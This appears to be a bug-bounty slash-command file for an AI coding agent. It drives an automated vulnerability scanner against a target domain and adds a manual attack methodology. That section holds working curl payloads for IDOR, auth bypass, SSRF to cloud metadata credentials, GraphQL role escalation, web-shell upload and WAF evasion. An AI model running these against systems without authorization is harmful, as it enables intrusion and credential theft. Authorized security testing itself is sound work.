---
description: Active vulnerability hunt against a target by invoking tools/hunt.py (which calls vuln_scanner.sh against recon/<target>/). Auto-runs recon first if no recon dir exists. Usage: /hunt target.com
---

# /hunt

Active vulnerability hunting on a target. **Always invoke the production script directly** — do not re-interpret the methodology below as instructions to execute step-by-step. The methodology is reference material; the script is the entry point.

## Run This (the only required step)

```bash
# If recon/<target>/ already exists, scan only:
python3 tools/hunt.py --target target.com --scan-only

# If no recon yet, run the full pipeline (recon then scan):
python3 tools/hunt.py --target target.com

# Quick mode (fewer checks, faster):
python3 tools/hunt.py --target target.com --quick
```

That's it. The script:
1. Reads `recon/<target>/` (subdomains, live hosts, URLs, gf-classified candidates).
2. Runs `tools/vuln_scanner.sh recon/<target>/` — XSS (dalfox), SQLi (linear-scaling verifier), SSTI math-canary probes, race conditions, RCE PoC, MFA/SAML checks.
3. Writes results to `findings/<target>/` with a `summary.txt`.

Output you should see (not a loop):

```
██████  ██████  ██   ██ ██   ██ ███   █ ███████
██   ██ ██   ██ ██   ██ ██   ██ ████  █   ███
██████  ██████  ███████ ██   ██ ██ ██ █   ███
██████  ██████  ███████ ██   ██ ██  ███   ███
██   ██ ██   ██ ██   ██ ██   ██ ██   ██   ███
██████  ██████  ██   ██ ███████ ██   ██   ███

+ Recon. Hunt. Validate. Report. +

┌──────────────────────────────────────────────────────┐
│ Target  target.com                                   │
│ Mode    full                                         │
│ Output  recon/target.com/                            │
│ Auth    session loaded                               │
└──────────────────────────────────────────────────────┘

 ● local   Ready   type /hunt to begin

bbhunt v4.3

[*] Running vulnerability scanner on target.com...
[+] XSS pipeline: N candidates
[+] SQLi verifier: ...
[+] SSTI canary: ...
[✓] HUNT COMPLETE — Summary Dashboard
```

Pass `--no-banner` for piped / CI output. Pipe through `python3 tools/dashboard.py --tail --kind scan --target target.com` for a live phase-by-phase progress dashboard instead of streaming logs.

## Usage

```
/hunt target.com                       (full hunt — recon then scan)
/hunt target.com --quick               (fewer checks; faster)
/hunt target.com --vuln-class idor     (manual deep-dive — see methodology below)
/hunt target.com --source-code ./repo  (static + live)
/hunt target.com --chrome              (browser-based — needs Chrome MCP)
/hunt targets.txt                      (multi-target — one domain per line)
```

`--vuln-class`, `--source-code`, `--chrome`, and multi-target are manual-mode flags that switch you out of the scripted pipeline and into the methodology below. They are not arguments to `tools/hunt.py`.

## Troubleshooting: "/hunt is looping / not actually hunting"

Symptom: `/recon` finishes, `recon/<target>/` is populated, but `/hunt target.com` just re-reads files, re-plans, and never invokes any scanner. Common on free / weaker models.

Cause: The model is reading the methodology prose below and trying to re-implement it step-by-step instead of running the production script.

Fix (run this directly in a shell — no prompt needed):
```bash
python3 tools/hunt.py --target target.com --scan-only
```

If `tools/vuln_scanner.sh` reports missing tools, install them first:
```bash
bash tools/install_tools.sh
```

If you're on a free OpenRouter model and the agent keeps narrating instead of executing, add this to your prompt:
> Run `python3 tools/hunt.py --target target.com --scan-only` and report the output. Do not re-implement the steps. Do not narrate the methodology. Run the command.

## Session Isolation

**One session per target.** Claude accumulates context — testing two targets in one session causes cross-contamination where payloads, assumptions, and findings from target A affect target B.

```bash
claude  →  /hunt targetA.com   # Terminal 1
claude  →  /hunt targetB.com   # Terminal 2 (separate process)
```

## Multi-Target

Create a `targets.txt` with one domain per line:
```
api.target.com
app.target.com
admin.target.com
```
Then loop the script:
```bash
while read -r t; do
  python3 tools/hunt.py --target "$t" --quick
done < targets.txt
```

## Source Code Mode (--source-code)

`tools/hunt.py` does not consume source code directly. For `--source-code`, treat it as a manual workflow:

1. Grep for hardcoded secrets and API keys.
2. Map routes → controllers; flag endpoints missing auth decorators.
3. Grep for dangerous sinks: `eval`, `exec`, `unserialize`, raw SQL concat.
4. Cross-reference findings against the live endpoints in `recon/<target>/live/urls.txt`.

## Chrome MCP Mode (--chrome)

Requires Chrome MCP configured in Claude Code settings. Enables flows the headless scanner can't reach:
- OAuth / SSO / 2FA flows that require JS
- DOM-based XSS (invisible to curl probes)
- WebSocket endpoints
- SPA route discovery (React/Vue/Angular)
- Real file upload and form submission

This is manual; not driven by `tools/hunt.py`.

---

# Reference Methodology (manual deep-dive — only when `--vuln-class` or `--source-code` is set)

Everything below is reference material for the manual flow. **Do not execute these as steps when running plain `/hunt target.com`** — the production script above already covers them. Use this section only when working a specific endpoint, bug class, or chain by hand.

## Phase 1: Read Before Touching (15 min)

### Read Program Scope
1. Go to program page (HackerOne/Bugcrowd/Intigriti)
2. Note ALL in-scope domains — only test these
3. Note ALL out-of-scope domains — never test these
4. Note impact types accepted (some exclude "low" severity)
5. Check average bounty — signals program generosity

### Read Disclosed Reports (Intel)
HackerOne Hacktivity for this program:
- `https://hackerone.com/TARGET_NAME/hacktivity`
- `https://hackerone.com/hacktivity?querystring=TARGET_NAME+IDOR`
- `https://hackerone.com/hacktivity?querystring=TARGET_NAME+SSRF`

Extract from each report: which endpoint, which bug class, what parameter, what check was missing, what they paid.

## Phase 1.5: WAF Fingerprint (1 min)

Identify the WAF before active probing — bypass strategy depends on vendor.

```bash
# Active fingerprint (install: pip install wafw00f)
wafw00f "https://$TARGET"
wafw00f "https://$TARGET" -a   # try all signatures

# Manual header check
curl -sIk "https://$TARGET" | grep -iE "cf-ray|x-amzn|x-cdn|x-sucuri|akamai|server:"
curl -sIk "https://$TARGET" | grep -iE "set-cookie:.*(cf_|incap_ses|visid_incap|TS[0-9a-f]{6}|barra)"
```

WAF → bypass strategy:
- **Cloudflare** — find origin IP first (crt.sh, SecurityTrails, Shodan); then payload encoding
- **AWS WAF** — SQL `/**/` comment split, oversized body bypass
- **Imperva** — unicode overlong `%c0%2e`, parameter pollution
- **F5 BIG-IP** — double-slash path `//admin`, strip `TS*` cookie

## Phase 2: Tech Stack Detection (2 min)

```bash
TARGET="target.com"
curl -sI "https://$TARGET" | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"
```

Stack → Primary bug class:
- Ruby on Rails → mass assignment, IDOR
- Django → IDOR (ModelViewSet), SSTI
- Flask → SSTI (render_template_string), SSRF
- Laravel → mass assignment, IDOR
- Express/Node → prototype pollution, path traversal
- Spring Boot → Actuator endpoints, SSTI
- Next.js → SSRF via Server Actions, open redirect
- GraphQL → introspection, IDOR via node(), auth bypass on mutations

## 403 Response Protocol

When any probe returns 403, follow this order before declaring dead-end:

```bash
# 1. Header/path/method matrix (auto-runs WAF fingerprint)
tools/bypass_403.sh "https://$TARGET/blocked-endpoint"

# 2. Payload-level encoding bypass (for SQLi/XSS keyword blocked)
tools/waf_encoder.py "<payload>" --class sqli
tools/waf_encoder.py "<payload>" --class xss

# 3. Upload endpoint blocked
tools/multipart_mutator.py --file ./shell.aspx --field file \
  --url "https://$TARGET/upload" --send

# 4. Cloudflare origin hunt (if Cloudflare detected and steps 1-3 fail)
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u

# 5. Still 403 after 5 min → kill, move to next surface
```

## Phase 3: Active Testing (manual — when the scripted scan isn't enough)

### IDOR

Create two accounts (attacker + victim). Log in as attacker, perform actions, note all IDs in requests. Replay with attacker's token but victim's IDs.

```bash
# HTTP method variation:
curl -X DELETE "https://target.com/api/user/123/orders" \
  -H "Authorization: Bearer ATTACKER_TOKEN"

# Older API version:
curl "https://target.com/api/v1/user/123/data"

# GraphQL node():
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ node(id: \"dXNlcjoy\") { ... on User { email phone } } }"}'
```

### Auth Bypass

```bash
for endpoint in export delete share archive download restore transfer admin; do
  curl -s -o /dev/null -w "$endpoint: %{http_code}\n" \
    "https://target.com/api/users/123/$endpoint" \
    -H "Authorization: Bearer ATTACKER_TOKEN"
done

curl -s "https://target.com/api/users/123/profile"  # no auth header
```

### SSRF

```bash
cat recon/$TARGET/ssrf-candidates.txt | head -20

interactsh-client &
INTERACT_URL="http://$(interactsh-client --poll)"
curl "https://target.com/api/image?url=$INTERACT_URL"

# If DNS callback confirmed → escalate to internal:
curl "https://target.com/api/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### GraphQL

```bash
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# If introspection on → enumerate mutations, then try without auth:
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUserRole(userId: 456, role: ADMIN) { success } }"}'
```

## Phase 4: A→B Signal Method

When you confirm bug A, immediately check for B and C:

| Found A | Check B | Check C |
|---|---|---|
| IDOR on GET | IDOR on PUT/DELETE same path | IDOR on sibling endpoints |
| Auth bypass on endpoint | Every sibling in same controller | Old API version |
| Stored XSS | Does admin view it? (priv esc) | Email/export/PDF rendering |
| SSRF DNS callback | Internal services (169.254.x.x) | SSRF via open redirect |
| S3 listing | JS bundles → grep secrets | .env files in bucket |
| OAuth no PKCE | CSRF on OAuth flow | Auth code reuse |
| Race on coupons | Race on credits/wallet | Race on rate limits |

3 rules before pursuing B: confirm A is real first (exact HTTP request + response); B must be a DIFFERENT bug; B must pass Gate 0 independently.

## Phase 5: Document Findings

Create `targets/<target>/SESSION.md`:

```markdown
# TARGET: target.com | DATE: [today] | CROWN JEWEL: [what attacker wants most]

## Active Leads
- [14:22] /api/v2/invoices/{id} — no ownership check visible. Testing...

## Dead Ends (don't revisit)
- /admin → IP restricted. Hard stop.

## Anomalies
- GET /api/export → 200 even without session cookie

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} — read+write from attacker session
```

## 20-Minute Rotation Rule

Every 20 min ask: "Am I making progress?" No → rotate to next endpoint or vuln class. **Fresh context finds more bugs than brute force.**

## Stop Signals (move on if you see these)

- 403 no matter what you try
- 20+ payload variations, identical response
- Finding needs 5+ simultaneous preconditions
- 30+ min on same endpoint with no progress

## Getting Specific Results (Anti-Vague Rule)

If Claude gives you a generic message like "try testing for XSS" or "check for IDOR", that is not useful. Demand specificity:

```
Give me the EXACT curl command to test endpoint X.
Include: full URL, exact headers (including auth token placeholder), exact body.
Do not describe what to do — show the command.
```

## Auto-Memory (runs at session end)

When the hunt session ends, run `/remember` to log a summary to hunt memory so `/pickup` picks it up next time. Runs silently — non-fatal. Keeps memory populated without requiring a manual note.
